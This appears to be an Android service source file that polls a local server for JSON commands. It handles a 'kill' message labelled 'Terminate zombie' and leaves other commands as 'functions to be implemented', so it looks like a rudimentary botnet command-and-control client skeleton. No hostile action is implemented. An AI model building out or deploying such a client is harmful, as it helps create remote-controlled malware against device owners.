package com.app.checker;

import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import static java.lang.Thread.sleep;

public class Fetcher extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //TODO do something useful

        Toast toast = Toast.makeText(getApplicationContext(), "Service successfully invoked", Toast.LENGTH_SHORT);
        toast.show();

        int i = 1;
        while(i < 5){
            try{
                new JsonTask().execute("http://192.168.1.4:80/test.json");
                sleep(2000);
                i=i+1;
            }
            catch (Exception e){
                e.printStackTrace();
                break;
            }
        }

        return Service.START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        //TODO for communication return IBinder implementation
        return null;
    }

    // HTTP Request for JSON objects
    private class JsonTask extends AsyncTask<String,String,String> {
        protected void onPreExecute()
        {
            super.onPreExecute();
        }
        @Override
        protected String doInBackground(String... params) {
            HttpURLConnection conn = null;
            BufferedReader buff = null;
            try{
                URL url = new URL(params[0]);
                conn = (HttpURLConnection)url.openConnection();
                conn.connect();

                InputStream stream = conn.getInputStream();

                buff = new BufferedReader(new InputStreamReader(stream));
                StringBuffer buffer = new StringBuffer();

                String line;
                while ((line = buff.readLine()) != null) {
                    buffer.append(line);
                    //Log.d("Response: ", "> " + line);
                }
                return buffer.toString();
            } catch (Exception e) {
                e.printStackTrace();
            } finally {
                if (conn != null) {
                    conn.disconnect();
                }
                try {
                    if (buff != null) {
                        buff.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return null;
        }

        // After fetching JSON response
        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);

            String task;

            try {
                JSONObject json = new JSONObject(result);
                task = json.getString("message");
                if(task.equals("kill")){
                    // Terminate zombie
                    stopSelf();
                } else {
                    // Functions to be implemented
                    Toast toast = Toast.makeText(getApplicationContext(), task, Toast.LENGTH_SHORT);
                    toast.show();
                }
            } catch (JSONException e) {
                Log.e("Error",e.getMessage());
            }
        }
    }
}